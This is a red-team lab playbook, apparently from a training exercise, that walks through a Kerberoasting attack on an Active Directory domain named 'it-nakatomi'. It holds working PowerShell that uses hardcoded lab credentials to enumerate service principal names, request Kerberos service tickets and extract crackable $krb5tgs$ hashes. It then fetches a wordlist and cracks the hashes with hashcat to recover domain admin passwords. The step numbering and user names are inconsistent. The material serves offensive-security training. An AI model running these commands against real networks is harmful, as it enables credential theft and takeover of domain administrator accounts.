# Advanced Kerberoasting


## **Playbook ID: 4.06** - Ad Exploitation SPN Kerberoasting - **MSEL Event ID: AT1-6**

C:\\Users\\Public\\Desktop\\LAB_FILES\\assets\\custom-procdump\\nimdump.dll



## Roast like a Ghost

1. Now that you have the SAM account names, perform a subsquent query to obtain the SPN names. These will be used to perform targeted kerberoasting attacks by obtaining the kerberos pre-authentication ticket hash from the DC.

```
$name=lex.walsh
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'[string[]]$spns=([adsisearcher]"(&(objectCategory=user)(samaccountname=$name))").findall()|%{$_.properties["serviceprincipalname"]};$spns'));
```

```
$name=al.powell
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'[string[]]$spns=([adsisearcher]"(&(objectCategory=user)(samaccountname=$name))").findall()|%{$_.properties["serviceprincipalname"]};$spns'));
```

```
$name=nia.daugherty
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'[string[]]$spns=([adsisearcher]"(&(objectCategory=user)(samaccountname=$name))").findall()|%{$_.properties["serviceprincipalname"]};$spns'));
```

***ITERATE THIS STEP FOR EACH USER FROM THE PREVIOUS STEP***
6. Armed with the list of the user SAM accounts and SPN names, we will perform the attack using the command below. Note that you will need to change the SPN and SAM account for each user (e.g., "`mssqlsvc/it-sql.it-nakatomi##.local`", "`al.powell`"). Copy the SPN hashes to crack offline.

> Note there are two locations in this commmand that you have to replace the ## with the enclave number.

```
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("mssqlsvc/it-sql.it-nakatomi##.local", "al.powell");'));
```
```
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("HOST/it-shrpt.it-nakatomi##.local", "lexi.walsh");'));
```
```
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("LDAP1/it-dc2.it-nakatomi##.local", "nia.daugherty");'));
```

7. Collect the hashes into a text file (`kerb.hash`) on your kali operater box. 

8. Get the provided word list (`rawk_you.txt`) from the file server, and run John/Hashcat with it.
   ```sh
   wget http://172.16.2.2:8080/rush_hour/rawk_you.txt \
   hashcat -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O ./kerb.hash ./rawk_you.txt
   ```
   Keep a text file with the decrypted passwords for each domain admin. You should have: `al.powell lexi.walsh nia.daugherty`.

